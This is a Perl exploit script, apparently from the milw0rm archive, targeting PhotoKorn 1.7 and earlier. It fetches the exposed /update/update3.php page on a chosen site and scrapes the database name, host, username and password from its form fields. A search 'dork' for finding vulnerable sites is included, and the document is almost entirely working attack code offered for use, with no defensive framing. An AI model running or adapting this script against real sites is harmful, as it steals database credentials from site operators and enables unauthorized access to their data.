<html><head><title>photokron <= 1.7 (update script) Remote Database Disclosure Exploit</title></head><pre>#!/usr/bin/perl
#Script : PhotoKron All Version
#All Version
#Author : Pr0metheuS
#Gr33tz to Gr33tz-Team
#Gr33tz-Team.ORG
#Dork : &quot;Powered by photokorn&quot;
### INFO ##
# Works IF /update/ is on server...60% site are vulnerable....
## INFO ##
use LWP::UserAgent;
if (@ARGV!=2) {
	print &quot;-=-=-=-=-=-=-=-=-=-=-=--=\n&quot;;
    print &quot;PhotoKorn Remote Database Info\n&quot;;
    print &quot;by Pr0metheuS\n&quot;;
    print &quot;perl $0 &lt;site&gt; &lt;path&gt;\n&quot;;
	print &quot;-=-=-=-=-=-=-=-=-=-=-=--=\n&quot;;
}
(my $site,my $path)=@ARGV;
my $ua = new LWP::UserAgent;
$ua-&gt;agent(&quot;Mozilla/8.0&quot;);
$ua = LWP::UserAgent-&gt;new;
my $req = HTTP::Request-&gt;new(GET =&gt; &quot;&quot;.$site.&quot;&quot;.$path.&quot;/update/update3.php&quot;);
$req-&gt;header('Accept' =&gt; 'text/html');
my $res = $ua-&gt;request($req);
my $con = $res-&gt;content;
if ($res-&gt;is_success) {
	print &quot;-=-=-=-=-=-=-=-=-=-=-=--=\n&quot;;
    print &quot;PhotoKorn Remote Database Info\n&quot;;
    print &quot;by Pr0metheuS\n\n&quot;;
    
if($con =~ /&lt;input type=&quot;text&quot; value=&quot;(.*)&quot; name=&quot;dbname&quot;&gt;/){
	$dbname = $1;
	print &quot;[+] DBNAME : $dbname\n&quot;;
}
if($con =~ /&lt;input type=&quot;text&quot; value=&quot;(.*)&quot; name=&quot;dbhost&quot;&gt;/){
	$dbhost = $1;
	print &quot;[+] DBHOST : $dbhost\n&quot;;
}
if($con =~ /&lt;input type=&quot;text&quot; value=&quot;(.*)&quot; name=&quot;dbusername&quot;&gt;&lt;\/td&gt;/){
	$dbuser = $1;
	print &quot;[+] DBUSER : $dbuser\n&quot;;
}
if($con =~ /&lt;input type=&quot;password&quot; value=&quot;(.*)&quot; name=&quot;dbpassword&quot;&gt;&lt;\/td&gt;/){
	$dbpass = $1;
	print &quot;[+] DBPASSWORD : $dbpass\n&quot;;
}
print &quot;-=-=-=-=-=-=-=-=-=-=-=--=\n&quot;;



}
else{
	print &quot;[+] Exploit Failed...\n&quot;;
}

# milw0rm.com [2008-01-11]</pre></html>